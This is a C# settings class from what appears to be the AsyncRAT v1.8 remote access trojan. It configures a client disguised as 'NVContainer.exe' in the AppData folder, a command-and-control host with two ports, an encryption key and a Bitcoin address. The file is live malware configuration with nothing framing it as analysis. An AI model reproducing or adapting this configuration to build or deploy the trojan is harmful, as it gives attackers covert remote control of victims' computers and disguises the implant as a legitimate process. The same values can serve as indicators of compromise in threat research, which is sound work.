using System;
using System.Collections.Generic;
using System.IO;

namespace AsyncRAT;

public class Settings
{
	public static readonly string ClientFullPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NVContainer.exe");

	public static readonly List<string> Hosts = new List<string>(new string[1] { "trytotrackme.pw" });

	public static readonly List<int> Ports = new List<int>(new int[2] { 6603, 6604 });

	public static readonly string KEY = "441441";

	public static readonly string BTC = "1LsLoq3MQku3CTu2dXrCFvFAyQYxY9kgbm";

	public static readonly string VER = "AsyncRAT v1.8";
}
